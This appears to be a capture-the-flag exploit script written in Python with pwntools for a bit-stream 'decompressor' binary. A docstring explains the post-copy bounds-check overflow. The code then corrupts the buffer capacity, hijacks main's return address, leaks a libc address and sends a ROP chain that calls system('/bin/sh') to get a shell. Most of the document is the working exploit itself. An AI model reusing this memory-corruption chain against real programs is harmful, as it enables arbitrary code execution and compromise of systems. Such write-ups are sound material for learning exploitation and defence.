"""
Binary takes a "compressed buffer" as input, "decompresses" it, prints out the result, and exits.

Both the input and output are stored as `Bitstream`s, which appears to be a subclass of
`basic_string_view`. This class provides bit-level access to the underlying string, which the binary
makes use of for both reading the input and writing the output.

The binary first reads 20 bits from the input, interpreting that as the size of the output buffer in
bytes. For the exploit we ensure this is < 16, in order to trigger small string optimization and
land the allocation on the stack.

The binary then reads 3 bits from the input, which it interprets as a command. Depending on the
command, more bits will be read from the input, and potentially written to the output. This process
repeats, until we read the stop command (or we run off the end of the input buffer).

The binary has commands to write data to the output buffer (write a single bit, write 8 bits at a
time), adjust the position of the cursor (the bit offset we're writing at), and copy a given number
of bits from a given offset behind the cursor. Most of the commands are bounds checked, but the copy
bits command only checks the bounds *after* it has finished copying the bits. 

We use this overflow to first overwrite the capacity of the output buffer, giving us unrestricted
out of bounds access (the capacity field is used during the bounds check). We use that access to
overwrite main's return address with the address of main itself, which will allow us to input
another buffer once we're done processing this one.

Next we leak a libc address by using the copy-bits function. Because the cursor value is first
divided by 8, making it negative (which we can do) doesn't actually allow us to index behind the
address of the buffer. Instead, we edit the pointer to the content buffer to point to a spot behind
it, allowing us to copy the bits from a random libc address on the stack into the output buffer.

We use the leaked libc address to build a rop chain to call system("/bin/sh"), and on the next loop
we again overwrite the capacity, and then overwrite the return address with the rop chain.
"""

from pwn import *

from bitstring import BitArray

binary_path = "./cold_patched"

lib_path = "./lib/"

#=Boilerplate=================================================================#

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""
python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        return remote("localhost", 1337)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io, msg=None):
    if args.GDB:
        if msg is not None:
            print(f"*** BREAKPOINT: {msg} ***")
        else:
            print("*** BREAKPOINT ***")
        io.interactive()


def reverse_bits(bit_array):
    result = BitArray()
    for x in range(0, len(bit_array), 8):
        result += bit_array[x:x+8:][::-1]
    return result


def write_bit(bit_array, value):
    bit_array += "uint:3=1"
    bit_array += f"uint:1={value}"


def write_byte(bit_array, value):
    bit_array += "uint:3=2"
    bit_array += f"uint:8={value}"


def copy_bits(bit_array, offset_back, count):
    bit_array += "uint:3=3"
    bit_array += f"uint:10={offset_back}"
    bit_array += f"uint:10={count}"


def adjust_cursor(bit_array, offset):
    bit_array += "uint:3=4"
    bit_array += f"int:16={offset}"


def write_bytes(bit_array, data):
    for b in data:
        write_byte(bit_array, b)


io = start()
io.readline()

# Size of < 16 bytes to allocate on the stack
size_str = "uint:20=15"
result = BitArray(size_str)

# Overwrite capacity using copy bits overflow, gives us out of bounds access
for x in range(14):
    write_byte(result, 0xff)
copy_bits(result, 64 + 16, 64 + 16)

# Copy address of _start over main return address. Allows us to loop
adjust_cursor(result, 7 * 64)
copy_bits(result, 3 * 64, 64)

# Adjust pointer of bitstream contents back, so we can copy some libc address
adjust_cursor(result, -0x2c0)
adjust_cursor(result, 3 * 64 + 8)
write_bit(result, 0) # 0x...ed08 -> 0x...ec08

# Readjust cursor to original buffer position
adjust_cursor(result, -0xc9) 
adjust_cursor(result, 256 * 8)

# Copy random libc address into output buffer
copy_bits(result, 6 * 64, 64)
result += "0b000"

padding = ((len(result) + 8 - 1) & -8) - len(result)
if padding > 0:
    result += ("0b" + "0"*padding)

result = reverse_bits(result)
io.sendline(result.bytes)

# Parse libc leak from output
io.recvuntil("Output: ")
leak = u64(io.readline()[:-1].ljust(8, b"\0"))
LIBC_LEAK_OFFSET = 0x8a3be
libc.address = leak - LIBC_LEAK_OFFSET
print(f"LEAK: {hex(libc.address)}")

# ===== Write system() rop chain =====

# Size of < 16 bytes to allocate on the stack
size_str = "uint:20=15"
result = BitArray(size_str)

# Overwrite capacity using copy bits overflow, gives us out of bounds access
for x in range(14):
    write_byte(result, 0xff)
copy_bits(result, 64 + 16, 64 + 16)

binsh_addr = next(libc.search(b"/bin/sh\0"))

rop = ROP(libc)
rop.system(binsh_addr)
rop.exit(13)

# Write rop chain
adjust_cursor(result, 7 * 64)
write_bytes(result, rop.chain())

result += "0b000"

padding = ((len(result) + 8 - 1) & -8) - len(result)
if padding > 0:
    result += ("0b" + "0"*padding)

result = reverse_bits(result)
io.sendline(result.bytes)

io.interactive()
